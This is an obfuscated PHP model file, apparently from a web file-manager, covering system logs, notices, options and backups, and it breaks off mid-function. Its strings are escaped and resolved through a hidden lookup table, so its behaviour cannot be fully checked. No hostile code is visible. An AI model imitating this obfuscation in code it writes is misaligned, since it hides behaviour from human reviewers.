<?php
 goto aóçƒ‡–ˆğ; a£¼¢ƒ¾çğ: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\151\x6d\145", "\x74\151\x6d\145", "\151\156\x73\x65\162\164", "\x66\165\x6e\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $çÄ¢òÅŒ =& $_SERVER[§Êá¸İ]; return array($çÄ¢òÅŒ[2338] => LNG($çÄ¢òÅŒ[2339]), $çÄ¢òÅŒ[2340] => LNG($çÄ¢òÅŒ[2341]), $çÄ¢òÅŒ[1920] => LNG($çÄ¢òÅŒ[2342]), $çÄ¢òÅŒ[2343] => LNG($çÄ¢òÅŒ[2344]), $çÄ¢òÅŒ[2345] => LNG($çÄ¢òÅŒ[2346]), $çÄ¢òÅŒ[2347] => LNG($çÄ¢òÅŒ[2348]), $çÄ¢òÅŒ[2349] => LNG($çÄ¢òÅŒ[2350]), $çÄ¢òÅŒ[1950] => LNG($çÄ¢òÅŒ[2350]), $çÄ¢òÅŒ[1951] => LNG($çÄ¢òÅŒ[2351]), $çÄ¢òÅŒ[2352] => LNG($çÄ¢òÅŒ[2353]), $çÄ¢òÅŒ[2354] => LNG($çÄ¢òÅŒ[2355]), $çÄ¢òÅŒ[2356] => LNG($çÄ¢òÅŒ[2357]), $çÄ¢òÅŒ[2358] => LNG($çÄ¢òÅŒ[2359]), $çÄ¢òÅŒ[1948] => LNG($çÄ¢òÅŒ[2360]), $çÄ¢òÅŒ[2361] => LNG($çÄ¢òÅŒ[2362]), $çÄ¢òÅŒ[1955] => LNG($çÄ¢òÅŒ[2363]), $çÄ¢òÅŒ[2364] => LNG($çÄ¢òÅŒ[2365]), $çÄ¢òÅŒ[2366] => LNG($çÄ¢òÅŒ[2367]), $çÄ¢òÅŒ[2368] => LNG($çÄ¢òÅŒ[2369]), $çÄ¢òÅŒ[2370] => LNG($çÄ¢òÅŒ[2371]), $çÄ¢òÅŒ[1958] => LNG($çÄ¢òÅŒ[2372]), $çÄ¢òÅŒ[1959] => LNG($çÄ¢òÅŒ[2373]), $çÄ¢òÅŒ[2374] => LNG($çÄ¢òÅŒ[2375]), $çÄ¢òÅŒ[2376] => LNG($çÄ¢òÅŒ[2377]), $çÄ¢òÅŒ[2378] => LNG($çÄ¢òÅŒ[2379]), $çÄ¢òÅŒ[1953] => LNG($çÄ¢òÅŒ[2380]), $çÄ¢òÅŒ[2381] => LNG($çÄ¢òÅŒ[2382]), $çÄ¢òÅŒ[1952] => LNG($çÄ¢òÅŒ[2383]), $çÄ¢òÅŒ[2384] => LNG($çÄ¢òÅŒ[2385]), $çÄ¢òÅŒ[2386] => LNG($çÄ¢òÅŒ[2387]), $çÄ¢òÅŒ[2388] => LNG($çÄ¢òÅŒ[2387]), $çÄ¢òÅŒ[2389] => LNG($çÄ¢òÅŒ[2390]), $çÄ¢òÅŒ[2391] => LNG($çÄ¢òÅŒ[2391]), $çÄ¢òÅŒ[2392] => LNG($çÄ¢òÅŒ[1924]), $çÄ¢òÅŒ[2393] => LNG($çÄ¢òÅŒ[2394]), $çÄ¢òÅŒ[2395] => LNG($çÄ¢òÅŒ[2396]), $çÄ¢òÅŒ[2397] => LNG($çÄ¢òÅŒ[2398]), $çÄ¢òÅŒ[2399] => LNG($çÄ¢òÅŒ[2400]), $çÄ¢òÅŒ[2401] => LNG($çÄ¢òÅŒ[2402]), $çÄ¢òÅŒ[2403] => LNG($çÄ¢òÅŒ[2403]), $çÄ¢òÅŒ[2404] => LNG($çÄ¢òÅŒ[2405]), $çÄ¢òÅŒ[2406] => LNG($çÄ¢òÅŒ[2407]), $çÄ¢òÅŒ[2408] => LNG($çÄ¢òÅŒ[2409]), $çÄ¢òÅŒ[2410] => LNG($çÄ¢òÅŒ[2411]), $çÄ¢òÅŒ[2412] => LNG($çÄ¢òÅŒ[2413]), $çÄ¢òÅŒ[2414] => LNG($çÄ¢òÅŒ[2415]), $çÄ¢òÅŒ[212] => LNG($çÄ¢òÅŒ[212]), $çÄ¢òÅŒ[213] => LNG($çÄ¢òÅŒ[2416]), $çÄ¢òÅŒ[2417] => LNG($çÄ¢òÅŒ[2417])); } private function typeFile() { $²«£Í«® =& $_SERVER[§Êá¸İ]; $šó·€ä = array($²«£Í«®[1955] => array($²«£Í«®[1956]), $²«£Í«®[2356] => array($²«£Í«®[2418]), $²«£Í«®[2358] => array($²«£Í«®[2419]), $²«£Í«®[1948] => array($²«£Í«®[1949], $²«£Í«®[2420]), $²«£Í«®[2366] => array(), $²«£Í«®[2368] => array(), $²«£Í«®[2370] => array(), $²«£Í«®[1958] => array($²«£Í«®[1960]), $²«£Í«®[1959] => array($²«£Í«®[1960]), $²«£Í«®[2374] => array($²«£Í«®[2421]), $²«£Í«®[2376] => array($²«£Í«®[2421]), $²«£Í«®[2378] => array($²«£Í«®[2422]), $²«£Í«®[2364] => array($²«£Í«®[2423]), $²«£Í«®[1953] => array($²«£Í«®[2424]), $²«£Í«®[2381] => array($²«£Í«®[2425]), $²«£Í«®[1952] => array($²«£Í«®[1954])); return $šó·€ä; } private function typeAll() { $ï´«‘ä± =& $_SERVER[§Êá¸İ]; $‚ŞÂ‡¯ = $this->typeList; $õ·Å¦áÖ = array_filter($this->typeFile()); foreach ($õ·Å¦áÖ as $Ä÷áğÕ => $íñÜëÈı) { $‚ŞÂ‡¯[$íñÜëÈı[0]] = $‚ŞÂ‡¯[$Ä÷áğÕ]; } $‚ŞÂ‡¯[$ï´«‘ä±[1960]] = LNG($ï´«‘ä±[2426]); $‚ŞÂ‡¯[$ï´«‘ä±[2421]] = LNG($ï´«‘ä±[2427]); return $‚ŞÂ‡¯; } public function addLog($„œ Œï¨, $¦ì¤°ÙÏ = array()) { $ø´£˜İ =& $_SERVER[§Êá¸İ]; if (!isset($this->typeList[$„œ Œï¨])) { return; } $û¸ÓŞÇú = Session::get($ø´£˜İ[2119]); if (!$û¸ÓŞÇú) { $û¸ÓŞÇú = _get($¦ì¤°ÙÏ, $ø´£˜İ[1779], 0); } if ($„œ Œï¨ == $ø´£˜İ[2393] && is_array($¦ì¤°ÙÏ[$ø´£˜İ[2428]]) && !$¦ì¤°ÙÏ[$ø´£˜İ[2428]]) { return; } $Â¿¼®† = get_client_ip(); if (!$¦ì¤°ÙÏ || strlen(json_encode($¦ì¤°ÙÏ)) >= 1024 * 64) { if ($¦ì¤°ÙÏ && is_array($¦ì¤°ÙÏ)) { $¦ì¤°ÙÏ = array_intersect_key($¦ì¤°ÙÏ, array_flip($ø´£˜İ[483], $ø´£˜İ[32])); $¦ì¤°ÙÏ[$ø´£˜İ[2429]] = $Â¿¼®†; } else { $¦ì¤°ÙÏ = array($ø´£˜İ[2429] => $Â¿¼®†); } } else { if (is_array($¦ì¤°ÙÏ)) { $¦ì¤°ÙÏ[$ø´£˜İ[2429]] = $Â¿¼®†; } else { $¦ì¤°ÙÏ = array($ø´£˜İ[1297] => $¦ì¤°ÙÏ, $ø´£˜İ[2429] => $Â¿¼®†); } } $¦ì¤°ÙÏ = array($ø´£˜İ[1769] => Session::sign(), $ø´£˜İ[1770] => intval($û¸ÓŞÇú), $ø´£˜İ[33] => $„œ Œï¨, $ø´£˜İ[1772] => json_encode($¦ì¤°ÙÏ)); parent::add($¦ì¤°ÙÏ); } public function remove($ØŸÉÄöÃ) { $this->where(array($_SERVER[§Êá¸İ][501] => $ØŸÉÄöÃ))->delete(); } private function _makeOrder($¿Ñéó•â = '') { $ú¦ôê«¨ =& $_SERVER[§Êá¸İ]; $–Ô¨³Ú = $ú¦ôê«¨[231]; $š“›Ú‡„ = array($ú¦ôê«¨[531] => $ú¦ôê«¨[532], $ú¦ôê«¨[533] => $ú¦ôê«¨[534]); $µ±°ÔÇ = Input::get($ú¦ôê«¨[539], $ú¦ôê«¨[7], $ú¦ôê«¨[2155], array($ú¦ôê«¨[2073], $ú¦ôê«¨[533])); $µ±°ÔÇ = $š“›Ú‡„[$µ±°ÔÇ]; $¿Ñéó•â = $¿Ñéó•â . "{$–Ô¨³Ú}\x20{$µ±°ÔÇ}"; return $this->order($¿Ñéó•â); } public function get($€õŒ¹Òá = '') { $ ÛĞŒŠ =& $_SERVER[§Êá¸İ]; if (!$€õŒ¹Òá) { show_json(array()); } $‹¹”éšª = array(); if ($€õŒ¹Òá[$ ÛĞŒŠ[1779]]) { $‹¹”éšª[$ ÛĞŒŠ[1779]] = $€õŒ¹Òá[$ ÛĞŒŠ[1779]]; } if (isset($€õŒ¹Òá[$ ÛĞŒŠ[847]])) { $¾ó³‡ˆû = $€õŒ¹Òá[$ ÛĞŒŠ[847]]; $–ä…©ë = isset($€õŒ¹Òá[$ ÛĞŒŠ[848]]) ? $€õŒ¹Òá[$ ÛĞŒŠ[848]] : time(); $‹¹”éšª[$ ÛĞŒŠ[231]] = array($ ÛĞŒŠ[409], array($¾ó³‡ˆû, $–ä…©ë)); } if ($€õŒ¹Òá[$ ÛĞŒŠ[33]]) { $§ˆÉŞ˜Ø = explode($ ÛĞŒŠ[50], $€õŒ¹Òá[$ ÛĞŒŠ[33]]); $–’ÁÌ = $this->typeFile(); $È¥¾ì£ø = array(); foreach ($§ˆÉŞ˜Ø as $•ÑÉæÀ) { $È¥¾ì£ø[] = $•ÑÉæÀ; if (isset($–’ÁÌ[$•ÑÉæÀ])) { $È¥¾ì£ø = array_merge($È¥¾ì£ø, $–’ÁÌ[$•ÑÉæÀ]); } } $È¥¾ì£ø = array_unique($È¥¾ì£ø); if ($È¥¾ì£ø) { $‹¹”éšª[$ ÛĞŒŠ[33]] = array($ ÛĞŒŠ[7], $È¥¾ì£ø); } } else { $‹¹”éšª[$ ÛĞŒŠ[33]] = array($ ÛĞŒŠ[2430], $ ÛĞŒŠ[2431]); } if (!empty($€õŒ¹Òá[$ ÛĞŒŠ[2429]])) { $‹¹”éšª[$ ÛĞŒŠ[534]] = array($ ÛĞŒŠ[459], "\x25{$€õŒ¹Òá[$ ÛĞŒŠ[2429]]}\45"); } $ê‘šØ¢­ = $this->_makeOrder()->where($‹¹”éšª)->selectPage(); if (empty($ê‘šØ¢­[$ ÛĞŒŠ[445]])) { show_json(array(), !0, $ê‘šØ¢­[$ ÛĞŒŠ[442]]); } $ê‘šØ¢­[$ ÛĞŒŠ[445]] = $this->logList($ê‘šØ¢­[$ ÛĞŒŠ[445]]); return $ê‘šØ¢­; } private function ipAddress(&$»÷½ØƒÅ) { $à«–İ´‰ =& $_SERVER[§Êá¸İ]; if (!empty($»÷½ØƒÅ[$à«–İ´‰[2429]])) { $•»“î–‚ = IpLocation::get($»÷½ØƒÅ[$à«–İ´‰[2429]]); } else { $•»“î–‚ = LNG($à«–İ´‰[2432]); } $»÷½ØƒÅ[$à«–İ´‰[2433]] = $•»“î–‚; } private function descZipDownload($Ø¤®İÜ, &$†é–šõÁ) { $ƒ˜¿áú‚ =& $_SERVER[§Êá¸İ]; if (!isset($Ø¤®İÜ[$ƒ˜¿áú‚[2434]])) { return; } $ÔîêŒè¶ = json_decode($Ø¤®İÜ[$ƒ˜¿áú‚[2434]], !0); foreach ($ÔîêŒè¶ as $¤½· ¸¶) { try { $åîâ€ˆÖ = IO::infoFullSimple($¤½· ¸¶[$ƒ˜¿áú‚[87]]); } catch (Exception $‰ªº¾ğ§) { continue; } $Ø¤®İÜ[$ƒ˜¿áú‚[87]] = $¤½· ¸¶[$ƒ˜¿áú‚[87]]; $†é–šõÁ[] = $Ø¤®İÜ[$ƒ˜¿áú‚[193]] = $åîâ€ˆÖ[$ƒ˜¿áú‚[193]]; $†é–šõÁ[] = $Ø¤®İÜ[$ƒ˜¿áú‚[2211]] = $åîâ€ˆÖ[$ƒ˜¿áú‚[192]]; break; } return $Ø¤®İÜ; } private function getSourceList(&$ÏâèŠ¦ë) { $úˆ­²Çš =& $_SERVER[§Êá¸İ]; $Ò³ğ–çÊ = array(); foreach ($ÏâèŠ¦ë as $¸ÅËİš„ => $Í¿™Õ¢ª) { $ë‘™ò€µ = json_decode($Í¿™Õ¢ª[$úˆ­²Çš[534]], !0); if ($Í¿™Õ¢ª[$úˆ­²Çš[33]] == $úˆ­²Çš[1951]) { $ë‘™ò€µ = $this->descZipDownload($ë‘™ò€µ, $Ò³ğ–çÊ); $ÏâèŠ¦ë[$¸ÅËİš„][$úˆ­²Çš[534]] = json_encode($ë‘™ò€µ); continue; } if (strpos($Í¿™Õ¢ª[$úˆ­²Çš[33]], $úˆ­²Çš[2213]) !== 0) { if (!isset($ë‘™ò€µ[$úˆ­²Çš[87]]) || strpos($Í¿™Õ¢ª[$úˆ­²Çš[33]], $úˆ­²Çš[2435]) !== 0) { continue; } try { $¥ËªãÆ² = IO::infoFullSimple($ë‘™ò€µ[$úˆ­²Çš[87]]); } catch (Exception $ôÄ¹ïó‰) { continue; } $Ò³ğ–çÊ[] = $ë‘™ò€µ[$úˆ­²Çš[193]] = $¥ËªãÆ²[$úˆ­²Çš[193]]; $Ò³ğ–çÊ[] = $ë‘™ò€µ[$úˆ­²Çš[2211]] = $¥ËªãÆ²[$úˆ­²Çš[192]]; $ÏâèŠ¦ë[$¸ÅËİš„][$úˆ­²Çš[534]] = json_encode($ë‘™ò€µ); continue; } $Ò³ğ–çÊ[] = $ë‘™ò€µ[$úˆ­²Çš[193]]; $Ò³ğ–çÊ[] = $ë‘™ò€µ[$úˆ­²Çš[2211]]; if ($ë‘™ò€µ[$úˆ­²Çš[33]] == $úˆ­²Çš[628]) { $Ò³ğ–çÊ[] = $ë‘™ò€µ[$úˆ­²Çš[534]][$úˆ­²Çš[1251]]; $Ò³ğ–çÊ[] = $ë‘™ò€µ[$úˆ­²Çš[534]][$úˆ­²Çš[1252]]; } if ($ë‘™ò€µ[$úˆ­²Çš[33]] == $úˆ­²Çš[2222]) { $Ò³ğ–çÊ[] = $ë‘™ò€µ[$úˆ­²Çš[534]][$úˆ­²Çš[193]]; } } if (!$Ò³ğ–çÊ) { return array(); } return Model($úˆ­²Çš[911])->sourceListInfo($Ò³ğ–çÊ, !0); } private function logList($ŞÈì˜¢³) { $õñ¯ÜŞÏ =& $_SERVER[§Êá¸İ]; $·­‡¢® = array_to_keyvalue($ŞÈì˜¢³, $õñ¯ÜŞÏ[12], $õñ¯ÜŞÏ[1779]); $±©ë”Äï = Model($õñ¯ÜŞÏ[606])->userListInfo(array_unique($·­‡¢®)); $ˆÕş­Äù = $this->getSourceList($ŞÈì˜¢³); $ÌÏÙ¦‘ = $this->typeAll(); $òš­€í– = array(); $”ÌÎı¡ = array(); foreach ($ŞÈì˜¢³ as $¸ÂöÙ¦î => $°¿·Ñ°É) { $ı¢¾ÚÆÔ = $°¿·Ñ°É[$õñ¯ÜŞÏ[33]]; $±ºğ»ö = isset($±©ë”Äï[$°¿·Ñ°É[$õñ¯ÜŞÏ[1779]]]) ? $±©ë”Äï[$°¿·Ñ°É[$õñ¯ÜŞÏ[1779]]] : !1; $”â¤»áÏ = strpos($ı¢¾ÚÆÔ, $õñ¯ÜŞÏ[2436]) === 0 ? LNG($õñ¯ÜŞÏ[2437]) : LNG($õñ¯ÜŞÏ[2432]); $°¿·Ñ°É[$õñ¯ÜŞÏ[32]] = isset($±ºğ»ö[$õñ¯ÜŞÏ[32]]) ? $±ºğ»ö[$õñ¯ÜŞÏ[32]] : LNG($õñ¯ÜŞÏ[2432]); $°¿·Ñ°É[$õñ¯ÜŞÏ[2266]] = isset($±ºğ»ö[$õñ¯ÜŞÏ[2266]]) ? $±ºğ»ö[$õñ¯ÜŞÏ[2266]] : $õñ¯ÜŞÏ[12]; $°¿·Ñ°É[$õñ¯ÜŞÏ[1668]] = isset($ÌÏÙ¦‘[$ı¢¾ÚÆÔ]) ? $ÌÏÙ¦‘[$ı¢¾ÚÆÔ] : $”â¤»áÏ; $°¿·Ñ°É[$õñ¯ÜŞÏ[2154]] = $±ºğ»ö; $¹­±Ë‰ = json_decode($°¿·Ñ°É[$õñ¯ÜŞÏ[534]], !0); $°¿·Ñ°É[$õñ¯ÜŞÏ[2429]] = isset($¹­±Ë‰[$õñ¯ÜŞÏ[2429]]) ? $¹­±Ë‰[$õñ¯ÜŞÏ[2429]] : $õñ¯ÜŞÏ[12]; $°¿·Ñ°É[$õñ¯ÜŞÏ[2433]] = IpLocation::get($°¿·Ñ°É[$õñ¯ÜŞÏ[2429]]); if (strpos($ı¢¾ÚÆÔ, $õñ¯ÜŞÏ[2213]) === 0 || isset($¹­±Ë‰[$õñ¯ÜŞÏ[2211]])) { $¹­±Ë‰[$õñ¯ÜŞÏ[90]] = $ˆÕş­Äù[$¹­±Ë‰[$õñ¯ÜŞÏ[193]]]; $¹­±Ë‰[$õñ¯ÜŞÏ[2227]] = $ˆÕş­Äù[$¹­±Ë‰[$õñ¯ÜŞÏ[2211]]]; if ($¹­±Ë‰[$õñ¯ÜŞÏ[33]] == $õñ¯ÜŞÏ[628]) { $¹­±Ë‰[$õñ¯ÜŞÏ[534]][$õñ¯ÜŞÏ[1251]] = $ˆÕş­Äù[$¹­±Ë‰[$õñ¯ÜŞÏ[534]][$õñ¯ÜŞÏ[1251]]]; $¹­±Ë‰[$õñ¯ÜŞÏ[534]][$õñ¯ÜŞÏ[1252]] = $ˆÕş­Äù[$¹­±Ë‰[$õñ¯ÜŞÏ[534]][$õñ¯ÜŞÏ[1252]]]; } if ($¹­±Ë‰[$õñ¯ÜŞÏ[33]] == $õñ¯ÜŞÏ[2222]) { $¹­±Ë‰[$õñ¯ÜŞÏ[534]][$õñ¯ÜŞÏ[193]] = $ˆÕş­Äù[$¹­±Ë‰[$õñ¯ÜŞÏ[534]][$õñ¯ÜŞÏ[193]]]; } if ($¹­±Ë‰[$õñ¯ÜŞÏ[33]] == $õñ¯ÜŞÏ[1946]) { $¹­±Ë‰[$õñ¯ÜŞÏ[2227]] = $¹­±Ë‰[$õñ¯ÜŞÏ[90]]; $¹­±Ë‰[$õñ¯ÜŞÏ[2211]] = $¹­±Ë‰[$õñ¯ÜŞÏ[2227]][$õñ¯ÜŞÏ[193]]; $¹­±Ë‰[$õñ¯ÜŞÏ[90]] = !1; $¹­±Ë‰[$õñ¯ÜŞÏ[193]] = $õñ¯ÜŞÏ[12]; } $ãªªş Ğ = array($õñ¯ÜŞÏ[1946], $õñ¯ÜŞÏ[2209]); if (!in_array($¹­±Ë‰[$õñ¯ÜŞÏ[33]], $ãªªş Ğ)) { if ($¹­±Ë‰[$õñ¯ÜŞÏ[90]] && $¹­±Ë‰[$õñ¯ÜŞÏ[90]][$õñ¯ÜŞÏ[190]] == $õñ¯ÜŞÏ[191]) { $”ÌÎı¡[] = $°¿·Ñ°É[$õñ¯ÜŞÏ[483]]; unset($ŞÈì˜¢³[$¸ÂöÙ¦î]); continue; } if ($¹­±Ë‰[$õñ¯ÜŞÏ[2227]] && $¹­±Ë‰[$õñ¯ÜŞÏ[2227]][$õñ¯ÜŞÏ[190]] == $õñ¯ÜŞÏ[191]) { $”ÌÎı¡[] = $°¿·Ñ°É[$õñ¯ÜŞÏ[483]]; unset($ŞÈì˜¢³[$¸ÂöÙ¦î]); continue; } } } $°¿·Ñ°É[$õñ¯ÜŞÏ[534]] = $¹­±Ë‰; unset($°¿·Ñ°É[$õñ¯ÜŞÏ[2438]]); $òš­€í–[] = $°¿·Ñ°É; } $this->clearSystemPathLog($”ÌÎı¡); return $òš­€í–; } private function clearSystemPathLog($ûğÈçÓş) { $î˜É¨·â =& $_SERVER[§Êá¸İ]; if (count($ûğÈçÓş) == 0) { return; } $ºõÂ†¿î = array($î˜É¨·â[483] => array($î˜É¨·â[7], array_unique($ûğÈçÓş))); $this->where($ºõÂ†¿î)->delete(); } public function deviceList($îÁ»±ê, $ÜÊÆªÚ‡ = 0) { $ğïùéâ =& $_SERVER[§Êá¸İ]; $ßƒ‡•ãª = array($ğïùéâ[1779] => $îÁ»±ê, $ğïùéâ[231] => array($ğïùéâ[1102], $ÜÊÆªÚ‡), $ğïùéâ[33] => $ğïùéâ[1920]); $‘²ˆÎ¼¯ = array(); $¡®¹ÜÂ = $this->field($ğïùéâ[2439])->where($ßƒ‡•ãª)->order($ğïùéâ[2225])->limit(50)->select(); foreach ($¡®¹ÜÂ as $ğ¬¨ø±ç => $É€½×²ƒ) { if ($ğ¬¨ø±ç > 0 && abs($É€½×²ƒ[$ğïùéâ[231]] - $¡®¹ÜÂ[$ğ¬¨ø±ç - 1][$ğïùéâ[231]]) < 5) { continue; } $‹ºØ–ˆı = json_decode($É€½×²ƒ[$ğïùéâ[534]], !0); $É€½×²ƒ[$ğïùéâ[2429]] = isset($‹ºØ–ˆı[$ğïùéâ[2429]]) ? $‹ºØ–ˆı[$ğïùéâ[2429]] : $ğïùéâ[12]; unset($‹ºØ–ˆı[$ğïùéâ[2429]]); $ß…—Ø×¡ = $this->deviceType($‹ºØ–ˆı[$ğïùéâ[2214]]); if (isset($‘²ˆÎ¼¯[$ß…—Ø×¡])) { continue; } $É€½×²ƒ[$ğïùéâ[2433]] = IpLocation::get($É€½×²ƒ[$ğïùéâ[2429]]); $É€½×²ƒ[$ğïùéâ[534]] = $‹ºØ–ˆı; $‘²ˆÎ¼¯[$ß…—Ø×¡] = $É€½×²ƒ; } return array_values($‘²ˆÎ¼¯); } public function deviceType($ÅËÒëï±) { return $ÅËÒëï±; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\156\157\x74\151\x63\x65\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\143\157\x6e\x74\x65\156\164", "\x61\x75\x74\x68", "\155\157\x64\x65", "\x74\x69\155\145", "\164\x79\x70\x65", "\x6c\145\x76\x65\x6c", "\145\156\141\142\x6c\145", "\x73\157\162\164"); public function listData($ÔÕø²¾§ = false, $²÷Ó…ò¯ = "\x73\157\x72\164", $öÙº¢ãô = false) { return parent::listData($ÔÕø²¾§, $²÷Ó…ò¯, $öÙº¢ãô); } public function add($½®Ìä†) { $Ñ‰Ëæì¥ =& $_SERVER[§Êá¸İ]; $éÂ‚ï› = time(); if ($½®Ìä†[$Ñ‰Ëæì¥[16]] == $Ñ‰Ëæì¥[2440]) { $éÂ‚ï› = strtotime($½®Ìä†[$Ñ‰Ëæì¥[206]]); } $½®Ìä†[$Ñ‰Ëæì¥[206]] = $éÂ‚ï›; return parent::insert($½®Ìä†); } public function update($ÕÚ™øÏ, $ÜÌÌëòù) { $–Òù‡éˆ =& $_SERVER[§Êá¸İ]; $òìÄæçü = $this->listData($ÕÚ™øÏ); if (!$òìÄæçü) { return !1; } $´ß“İÇ× = time(); if ($ÜÌÌëòù[$–Òù‡éˆ[16]] == $–Òù‡éˆ[2440]) { $´ß“İÇ× = strtotime($ÜÌÌëòù[$–Òù‡éˆ[206]]); } $ÜÌÌëòù[$–Òù‡éˆ[206]] = $´ß“İÇ×; return parent::update($ÕÚ™øÏ, $ÜÌÌëòù); } public function remove($ÇğÓ¢ßÚ) { $¾¬¸§¿„ = $this->listData($ÇğÓ¢ßÚ); if (!$¾¬¸§¿„ || $¾¬¸§¿„[$_SERVER[§Êá¸İ][191]]) { return !1; } return parent::remove($ÇğÓ¢ßÚ); } public function sort($ÜáøĞ¿†, $€ß’û²ú) { return parent::update($ÜáøĞ¿†, $€ß’û²ú); } public function enable($“½È¬Š, $ÉÊğÎÁ—) { return parent::update($“½È¬Š, array($_SERVER[§Êá¸İ][2441] => $ÉÊğÎÁ—)); } private function initUserOption() { $ÊÆè„Æ¶ =& $_SERVER[§Êá¸İ]; $this->optionType = $ÊÆè„Æ¶[2442]; $this->modelType = $ÊÆè„Æ¶[2443]; $this->field = array($ÊÆè„Æ¶[2444], $ÊÆè„Æ¶[32], $ÊÆè„Æ¶[206], $ÊÆè„Æ¶[33], $ÊÆè„Æ¶[2445], $ÊÆè„Æ¶[837], $ÊÆè„Æ¶[226]); } public function userNoticeGet($ÕŞÖšü¼ = false) { $this->initUserOption(); return parent::listData($ÕŞÖšü¼, $_SERVER[§Êá¸İ][483], !0); } public function userNoticeAdd($è¡·¢¥½) { $ˆİ¯ê€÷ =& $_SERVER[§Êá¸İ]; $this->initUserOption(); $Û‚‘‡„ä = $this->findByKey($ˆİ¯ê€÷[2444], $è¡·¢¥½[$ˆİ¯ê€÷[483]]); if ($Û‚‘‡„ä) { return !0; } $ó­¦à·„ = array($ˆİ¯ê€÷[2444] => $è¡·¢¥½[$ˆİ¯ê€÷[483]], $ˆİ¯ê€÷[32] => $è¡·¢¥½[$ˆİ¯ê€÷[32]], $ˆİ¯ê€÷[206] => $è¡·¢¥½[$ˆİ¯ê€÷[206]], $ˆİ¯ê€÷[33] => isset($è¡·¢¥½[$ˆİ¯ê€÷[33]]) ? $è¡·¢¥½[$ˆİ¯ê€÷[33]] : 1, $ˆİ¯ê€÷[2445] => isset($è¡·¢¥½[$ˆİ¯ê€÷[2445]]) ? $è¡·¢¥½[$ˆİ¯ê€÷[2445]] : 0, $ˆİ¯ê€÷[837] => 0, $ˆİ¯ê€÷[226] => 0); return parent::insert($ó­¦à·„); } public function userNoticeEdit($êŸèÙÂ, $ƒ¨‚Ù»¸) { $this->initUserOption(); return parent::update($êŸèÙÂ, $ƒ¨‚Ù»¸); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\x6d\x5f\x6f\x70\164\x69\157\156"; protected $jsonField = array("\155\x65\x6e\165", "\x72\157\x6c\145", "\x72\157\x6c\x65\x47\x72\x6f\165\160", "\x72\145\x67\151\163\x74", "\x65\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($÷·úÂÀÇ) { return "\123\x79\x73\164\x65\x6d\117\x70\x74\151\x6f\156\137{$÷·úÂÀÇ}"; } protected function optionDefault($•æî¨¤ä = '') { $…Óá÷œ± =& $_SERVER[§Êá¸İ]; if ($•æî¨¤ä == $…Óá÷œ±[12]) { return $GLOBALS[$…Óá÷œ±[6]][$…Óá÷œ±[457]]; } } } goto dĞ®ßê‘; fŞ«ç«î: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\142\141\143\x6b\165\x70\114\x69\x73\x74"; public $field = array("\151\157", "\156\141\155\x65", "\x73\x74\141\x74\x75\163", "\143\x6f\x6e\x74\x65\156\164", "\155\x61\x6e\x75\x61\x6c", "\x72\145\x73\x75\x6c\x74", "\164\151\155\145\106\x72\157\x6d", "\164\x69\155\x65\124\x6f"); public function config() { $ëàºûŠŠ =& $_SERVER[§Êá¸İ]; Action($ëàºûŠŠ[2003])->taskInit(); $’Åúãç  = Model($ëàºûŠŠ[857])->get($ëàºûŠŠ[870]); $’Åúãç  = json_decode($’Åúãç , !0); $’Åúãç  = is_array($’Åúãç ) ? $’Åúãç  : array(); $this->parseContent($’Åúãç ); unset($’Åúãç [$ëàºûŠŠ[1749]]); Model($ëàºûŠŠ[1748])->cacheClear(); $Ÿº„ú§Ê = $ëàºûŠŠ[2004]; $±÷Ïùù = Model($ëàºûŠŠ[2005])->findByKey($ëàºûŠŠ[1767], $Ÿº„ú§Ê); if (!$±÷Ïùù) { $±÷Ïùù = array(); } if (isset($±÷Ïùù[$ëàºûŠŠ[206]])) { $±÷Ïùù[$ëàºûŠŠ[206]] = json_decode($±÷Ïùù[$ëàºûŠŠ[206]], !0); } if (isset($’Åúãç [$ëàºûŠŠ[206]])) { $±÷Ïùù[$ëàºûŠŠ[206]][$ëàºûŠŠ[1752]] = $’Åúãç [$ëàºûŠŠ[206]]; unset($’Åúãç [$ëàºûŠŠ[206]]); } return array_merge($±÷Ïùù, $’Åúãç ); } public function listData($²±†™çÏ = false, $½¬¥¯Ê = "\x6d\157\144\151\146\171\x54\x69\x6d\145", $Ç¬İÜó³ = false) { $¨æø×åœ = parent::listData($²±†™çÏ, $½¬¥¯Ê, !0); if (!$¨æø×åœ) { return $¨æø×åœ; } if ($²±†™çÏ) { $¨æø×åœ = array($¨æø×åœ); } foreach ($¨æø×åœ as &$â¥½¥Ò˜) { $this->parseContent($â¥½¥Ò˜); } return $²±†™çÏ ? $¨æø×åœ[0] : $¨æø×åœ; } public function parseContent(&$Å˜Öì¼ş) { $ªŠê› =& $_SERVER[§Êá¸İ]; $Î¡ú¦—Í = _get($Å˜Öì¼ş, $ªŠê›[171], $ªŠê›[91]); if (!in_array($Î¡ú¦—Í, array($ªŠê›[863], $ªŠê›[1221]))) { $Å˜Öì¼ş[$ªŠê›[171]] = $Î¡ú¦—Í == $ªŠê›[91] ? $ªŠê›[1221] : $ªŠê›[863]; } } public function lastItem() { $Ëøã”ú¾ = $this->listData(); return !empty($Ëøã”ú¾[0]) ? $Ëøã”ú¾[0] : null; } public function kill($ùª®˜º) { $”Ğ—ş™è =& $_SERVER[§Êá¸İ]; $§¶‘¼© = $this->listData($ùª®˜º); if (!$§¶‘¼© || empty($§¶‘¼©[$”Ğ—ş™è[32]])) { return !0; } Task::kill($”Ğ—ş™è[869]); Task::kill($”Ğ—ş™è[887]); Task::kill($”Ğ—ş™è[896]); $İİıÁü = $§¶‘¼©[$”Ğ—ş™è[32]]; $×ÏšÚË = TEMP_FILES . $”Ğ—ş™è[866] . $İİıÁü . $”Ğ—ş™è[8]; IO::remove($×ÏšÚË, !1); return $this->remove($ùª®˜º); } public function remove($§·– û©) { $Ì‡À–¢ = $this->listData($§·– û©); if (!$Ì‡À–¢) { return !0; } return $this->backupRemove($Ì‡À–¢); } private function backupRemove($òºÊÌÌï) { parent::remove($òºÊÌÌï[$_SERVER[§Êá¸İ][483]]); $ìÃÓÇ“¹ = $this->backupPath($òºÊÌÌï); 